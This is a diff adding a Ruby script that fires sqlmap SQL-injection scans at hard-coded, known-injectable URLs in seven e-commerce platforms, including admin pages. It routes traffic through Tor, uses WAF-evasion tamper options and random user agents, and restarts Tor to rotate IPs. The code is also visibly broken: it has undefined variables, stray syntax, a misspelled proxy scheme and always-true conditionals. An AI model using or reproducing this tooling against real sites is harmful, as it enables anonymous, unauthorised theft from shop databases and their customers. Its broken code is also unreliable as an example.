@@ -1,0 +1,287 @@
+#!/usr/bin/ruby
+require 'thread'
+host = ARGV[0] 
+`mkdir cartdump`
+`cd ./cartdump`
+
+def cscart 
+	
+	cst = "#{host}/index.php?dispatch=products.view&product_id=289*"	
+	`mkdir cscart`
+	`cd ./cscart`	
+	`echo #{cst} >> try1`
+	cstr1 = Thread.new{`sqlmap -u #{cst} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> try1`} 
+	sd = "'#{host}/index.php?target=products&mode=search&subcats=Y&type=extended&avail=Y&pshor=Y&pfull=Y&pname=Y&cid=0&q=&x=11&y=3&sort_by=4*'"
+	`echo #{sd} >> try2`
+	pd = "'#{host}/index.php?target=products&mode=search&subcats=Y&type=extended&avail=Y&pshor=Y&pfull=Y&pname=Y&cid=0&q=%27&x=11&y=3&sort_by=product&sort_order=4*'"
+	cstr2 = Thread.new{`sqlmap -u #{wd} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050" >> try2 `}
+	
+	`echo #{pd} >> try3`
+	cstr3 = Thread.new{`sqlmap -u #{pd} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> try3`}
+	ding = "'#{host}/index.php?dispatch=reward_points.userlog&result_ids=pagination_contents&sort_by=timestamp&sort_order=3*'"
+	`echo #{ding} >> try4`
+	cstr4 = Thread.new{`sqlmap -u #{ding} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> try4`}
+	sob = host + "/controllers/customer/products.php?tabs_group_id=32" 
+	`echo #{sob} >> try5`
+	cstr5 = Thread.new{`sqlmap -u #{sob} --random-agent --tamper likerandomcasecomment --proxy socks4://127.0.0.1:9050 >> try5`}
+	
+	cstr1.join
+	cstr2.join
+	cstr3.join
+	cstr4.join
+	cstr5.join
+	
+	filea = ["try1", "try2", "try3", "try4", "try5"]
+	filea.each do |files|
+		puts `cat #{files} | grep vulnerable`
+	end
+
+end  
+
+
+def cubecart
+	ccq = "'#{host}/modules/gateway/Protx/confirmed.php?oid=12*&crypt=1'"
+	`mkdir cubecart`	
+	`cd ./cubecart`
+	`echo #{ccq} >> ccf1`
+	cct1 =Thread.new{`sqlmap -u #{ccq} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> ccf1`}
+	vcw = "'#{host}/index.php?_a=viewProd&productId=22*'"
+	`echo #{vcw} > ccf2`
+	cct2 = Thread.new{`sqlmap #{vcw} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> ccf2`}
+	= cu = "#{host}/CubeCart/index.php?_g=co&_a=step2"
+	`echo #{cu} > ccf3`
+	cct3 = Thread.new{`sqlmap -u #{cu} -p --data "quan%5B3afcdbfeb6ecfbdd0ba628696e3cc163%5D=3&shipKey=1'*&coupon=4" --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> ccf3`}
+	w = host + '/index.php?cat_id=19'
+	`echo #{w} >> ccf4`
+	cct4 = Thread.new{`sqlmap -u #{w} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> ccf4`}
+	fu = "#{host}/cart/index.php?cat_id=19"
+	`echo #{fu} > ccf5`
+	cct5 = Thread.new{`sqlmap -u #{fu}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> ccf5`}
+
+	fde = "'#{host}}/index.php?_a=viewProd&productId=43*'"
+	`echo #{fde} > ccf6`
+	cct6 = Thread.new{`sqlmap -u #{fde} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> ccf6`}
+	fios = "#{host}/index.php?cat_id=4"
+	`echo #{fios} > ccf7`
+	cct7 = Thread.new{`sqlmap -u #{fios} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> ccf7`}
+	odi = "#{host}/view_cart.php?add=1"
+	`echo #{odi} > ccf8`
+	cct8 = Thread.new{`sqlmap -u #{odi}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> ccf8`}
+	
+	cct1.join 
+	cct2.join 
+	cct3.join 
+	cct4.join
+	cct5.join 
+	cct6.join 
+	cct7.join 
+	cct8.join 
+
+	
+	fa = ["ccf1", "ccf2", "ccf3", "ccf4", "ccf5", "ccf6", "ccf7", "ccf8"] 
+	fa.each do |die|	
+		puts `cat #{die} | grep vulnerable`
+	end 
+	`cd ../`
+	
+end  
+
+def metacart 
+	`mkdir metacart`
+	`cd ./metacart`
+	mcu = "#{host}/product.asp?intProdID=30"
+	`echo #{mcu} >> mcf1`
+	mct1 = Thread.new{`sqlmap -u #{mcu} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050`}
+	mcd =  "'#{host}/productsByCategory.asp?intCatalogID=&amp%3bpage=2&amp%3bstrCatalog_NAME=tops*'"	
+	`echo #{mcd} > mcf2`
+	mct2 = Thread.new{`sqlmap -u  #{mcd}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050`}
+	ymcmb = host + "/productsByCategory.asp?strSubCatalogID=35"
+	`echo #{ymcmb} > mcf3`
+	mct3 = Thread.new{`sqlmap -u #{ymcmb} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050`}
+	mcr = "'#{host}/productsByCategory.asp?strSubCatalogID=1&amp%3bcurCatalogID=20*&amp%3bstrSubCatalog_NAME=Laptops'"
+	`echo #{mcr} > mcf4`
+	maw =  "'#{host}/productsByCategory.asp?strSubCatalogID=1&amp%3bcurCatalogID=10001&amp%3bstrSubCatalog_NAME=skirts*'" 
+	`echo #{maw} > mcf5`
+
+	mct5 = Thread.new{`sqlmap -u #{maw} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> mcf5`} 
+	mcbd =  "'#{host}/searchAction.asp?chkText=yes*&strText=dcrab*&chkPrice=yes*&intPrice=all*&chkCat=yes*&strCat=1*'"
+	`echo mcbd >> mcf6`
+	
+	mct6`sqlmap -u #{mcbd}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> mcf6`
+	mcfar = ["mcf1", "mcf2", "mcf3", "mcf4", "mcf5", "mcf6"]
+
+	mct1.join 
+	mct2.join
+	mct3.join 
+	mct4.join
+	mct5.join
+	mct6.join
+
+	mcfar.each do |file|
+		puts `cat #{file} | grep vulnerable`
+	
+	end
+	`cd ../`
+end
+
+def xcart
+	`mkdir xcart`
+	xsq = "#{host}/cart.php?mode=add"
+	xcu = "#{host}/home.php?cat=5"
+	dsu = "#{host}/home.php?printable=yes"
+	isa = "#{host}/product.php?productid=3"
+	sq = "#{host}//product.php?mode=3"
+	ea =  "'#{host}/error_message.php?access_denied&id=4*'"
+	bu =  host + "/help.php?section=8"
+	ni = host + "/register.php?mode=4"
+	bea = host + "/search.php?mode=5"
+	nua =  host + "/giftcert.php?gcid=8"
+	lea = host + "/giftcert.php?gcindex=6" 
+
+	`echo #{xsq} > xcf1`
+	xct1 = Thread.new{`sqlmap -u #{xsq} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf1`}
+	`echo #{xcu} >> xcf2`
+	xct2 = Thread.new{`sqlmap -u #{xcu}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf2`}
+	`echo #{dsu} > xcf3`
+	xct3 = Thread.new{`sqlmap #{dsu} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf3`}
+	`echo #{isa} > xcf4`
+	xct4 = Thread.new{`sqlmap -u #{isa} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf4`}
+	`echo #{sq} >> xcf5`
+	xct5 = Thread.new{`sqlmap -u #{sq}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf5 `}
+	`echo #{ea} > xcf6`
+	xct6 = Thread.new{`sqlmap -u #{ea} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf6`}
+	`echo #{bu} >> xcf7`
+	xct7 = Thread.new{`sqlmap -u #{bu}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf7`}
+	`echo #{ni} > xcf8`
+	xct8 = Thread.new{`sqlmap -u #{ni}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf8`}
+	`echo #{bea} > xcf9`
+	xct9 = Thread.new{`sqlmap -u #{bea}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf9`}
+	`echo #{nua} >> xcf10`
+	xct10 = Thread.new{`sqlmap -u #{nua}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf10`}
+	`echo #{lea} >> xcf11`
+	xct11 = Thread.new{`sqlmap -u #{lea}  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> xcf11`}
+	xct1.join
+	xct2.join
+	xct3.join 
+	xct4.join
+	xct5.join
+	`sudo service tor restart`
+	sleep 60
+	xct6.join
+	xct7.join
+	xct8.join
+	xct9.join
+	xct10.join
+	xct11.join
+	
+	xcfar = ["xcf1", "xcf2", "xcf3", "xcf4", "xcf5", "xcf6", "xcf7", "xcf8", "xcf9", "xcf10", "xcf11"]
+	
+	xcfar.each do |view|
+		puts "xcart vulnerable pages"
+		puts view 
+		`cat view | grep vulnerable`
+	end
+end
+	
+def zeuscart
+	zu =  host + "/category_list.php?cid=-1"
+	lsv = "'#{host}/?do=featured&action=showmaincatlanding&maincatid=-2*'"
+	bis = "'#{host}/admin/?do=disporders&action=detail&id=1*'"
+	qu = "'#{host}/admin/?do=editcurrency&cid=1*'"
+	dew = "'#{host}/admin/?do=subadminmgt&action=edit&id=1*'"
+	
+	`echo #{zu} > zcf1`
+	zct1 = Thread.new{`sqlmap -u #{zu} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> zcf1`}
+	`echo #{lsv} > zcf2`
+	zct2 = Thread.new{`sqlmap -u #{lsv} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> zcf2`}
+	`echo #{bis} > zcf3`
+	zct3 = Thread.new{`sqlmap -u #{bis} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> zcf3`}
+	`echo #{qu} > zcf4`
+	zct4 = Thread.new{`sqlmap -u #{qu} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> zcf4`} 
+	`echo #{dew} >> zcf5`
+	zct5 = Thread.new{`sqlmap -u #{dew} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> zcf5`}
+	
+	zct1.join
+	zct2.join
+	zct3.join
+	zct4.join
+	zct5.join
+	
+	zcfarray = ["zcf1", "zcf2", "zcf3", "zcf4", "zcf5"]
+	puts "zeus cart vulnerable links"
+	zcfarray.each do |file|
+		
+		puts file 
+		puts `cat #{file} | grep vulnerable`
+		
+	end
+end
+
+def opencart 
+	slav =  "'#{host}/index.php?route=product/product&path=%27&product_id=30*'"
+	kry = "'#{host}/admin/index.php?route=openbay/openbay/editLoad&&product_id=1*'"
+	vis = "'#{host}/index.php?route=product%2Fcategory&path=20&page=frankies'*'"
+
+	`echo #{slav} > opcf1`
+	opct1 = Thread.new{`sqlmap -u #{slav} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> opcf1`} 
+	`echo #{kry} > opcf2`
+	opct2 = Thread.new{`sqlmap -u #{kry} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> opfc2`}
+	`echo #{vis} > opcf3`
+	opct3 = Thread.new{`sqlmap -u #{vis} --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050 >> opfc3`} 
+	
+	opct1.join
+	opct2.join
+	opct3.join 
+	puts "opencart sqli vulnerabilities"
+	opcfar = ["opcf1", "opcf2", "opcf3"]
+	opcfar.each do |sosa| 
+		puts sosa
+		`cat #{sosa} | grep vulnerable`
+	end
+	`cd ../`
+end 
+
+def zencart 
+	puts `sqlmap -u "'#{host}/admin/options_name_manager.php?option_page=1&option_order_by=5*'"  --random-agent --tamper likerandomcasecomment --proxy socsk4://127.0.0.1:9050`
+end
+
+
+def controlflow
+	puts "Choose your target."
+	puts "1. cscart"
+	puts "2. metacart"
+	puts "3/ cubecart"
+	puts "4. xcart"
+	puts "5. zeuscart"
+	puts "6. opencart"
+	puts "7. zencart"
+	puts "8. try all"
+	targ = STDIN.gets.chomp 
+	
+	if targ.downcase == 1 || "cscart"
+		cscart
+
+	elsif targ.downcase == 2 || "metacart"
+		metacart
+
+	elsif targ.downcase == 3 || "cubecart"
+		cubecart
+	elsif targ.downcase == 4 || "xcart"
+		xcart 
+	elsif targ.downcase == 5 || "zeuscart" 
+	
+	elsif targ.downcase == 7 || "zencart"
+		zencart
+	
+	elsif targ.downcase == 8 || "all" || "try all"
+		puts "fuck it I'm trying it all"
+		cscart 
+		metacart
+		cubecart 
+		xcart 
+		zeuscart
+		zencart 	
+	end 
+end 
+
+controlflow 
